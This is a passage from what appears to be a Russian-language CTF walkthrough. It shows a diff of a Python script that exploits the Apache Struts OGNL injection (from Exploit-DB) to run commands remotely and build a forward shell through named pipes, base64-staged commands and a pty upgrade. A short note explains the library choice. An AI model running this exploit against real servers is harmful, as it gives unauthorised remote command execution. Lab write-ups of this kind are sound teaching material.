@@ -412,28 +412,28 @@ class Stratosphere:
 
 		# Setting up shell
 		print('[*] Setting up forward shell on target')
-		MakeNamedPipes = f'mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh > {self.stdout} 2>&1'
-		self.RunRawCmd(MakeNamedPipes, timeout=0.5)
+		createNamedPipes = f'mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh > {self.stdout} 2>&1'
+		self.runRawCmd(createNamedPipes, timeout=0.5)
 
 		# Setting up read thread
 		print("[*] Setting up read thread")
 		self.interval = interval
-		thread = threading.Thread(target=self.ReadThread, args=())
+		thread = threading.Thread(target=self.readThread, args=())
 		thread.daemon = True
 		thread.start()
 
-	def ReadThread(self):
-		GetOutput = f'/bin/cat {self.stdout}'
+	def readThread(self):
+		getOutput = f'/bin/cat {self.stdout}'
 		while True:
-			result = self.RunRawCmd(GetOutput).decode('utf-8')
+			result = self.runRawCmd(getOutput).decode('utf-8')
 			if result:
 				print(result)
-				ClearOutput = f'echo -n "" > {self.stdout}'
-				self.RunRawCmd(ClearOutput)
+				clearOutput = f'echo -n "" > {self.stdout}'
+				self.runRawCmd(clearOutput)
 			time.sleep(self.interval)
 
 	# Source: https://www.exploit-db.com/exploits/41570
-	def RunRawCmd(self, cmd, timeout=50):
+	def runRawCmd(self, cmd, timeout=50):
 		payload = "%{(#_='multipart/form-data')."
 		payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
 		payload += "(#_memberAccess?"
@@ -459,18 +459,18 @@ class Stratosphere:
 			return urllib2.urlopen(request, timeout=timeout).read()
 		except httplib.IncompleteRead as e:
 			return e.partial
-		except: # _socket.timeout:
+		except:  # _socket.timeout:
 			pass
 
-	def WriteCmd(self, cmd):
-		b64cmd = base64.b64encode(f'{cmd.rstrip()}\n'.encode('utf-8')).decode('utf-8')
-		stage_cmd = f'base64 -d <<< {b64cmd} > {self.stdin}'
-		self.RunRawCmd(stage_cmd)
+	def writeCmd(self, cmd):
+		b64Cmd = base64.b64encode(f'{cmd.rstrip()}\n'.encode('utf-8')).decode('utf-8')
+		unwrapAndExec = f'base64 -d <<< {b64Cmd} > {self.stdin}'
+		self.runRawCmd(unwrapAndExec)
 		time.sleep(self.interval * 1.1)
 
-	def UpgradeShell(self):
-		UpgradeShell = """python3 -c 'import pty; pty.spawn("/bin/bash")'"""
-		self.WriteCmd(UpgradeShell)
+	def upgradeShell(self):
+		upgradeShell = """python3 -c 'import pty; pty.spawn("/bin/bash")'"""
+		self.writeCmd(upgradeShell)
 
 
 prompt = 'stratosphere> '
@@ -480,9 +480,9 @@ while True:
 	cmd = input(prompt)
 	if cmd == 'upgrade':
 		prompt = ''
-		S.UpgradeShell()
+		S.upgradeShell()
 	else:
-		S.WriteCmd(cmd)
+		S.writeCmd(cmd)
 ```
 
 Подробнее об этом способе можно узнать из [этого](https://www.youtube.com/watch?v=k6ri-LFWEj4 "VulnHub - Sokar - YouTube") туториала (0:15:36-0:39:10) прохождения машины с VulnHub'а. От себя добавлю, что в нашем случае представляется невозможным использование библиотеки `requests` для Python в силу особенностей используемой уязвимости: `requests` не умеет по-человечески работать с возвращаемым уязвимым сервером **IncompleteRead**, возбуждая исключение `requests.exceptions.ChunkedEncodingError`; если же использовать встроенные средства языка, то этот же ответ с IncompleteRead без проблем перехватывается исключением `http.client.IncompleteRead` и далее успешно обрабатывается как `e.partial`. Подробнее об этой проблеме [здесь](https://github.com/mazen160/struts-pwn/issues/8 "Issue with requests partial read · Issue #8 · mazen160/struts-pwn").
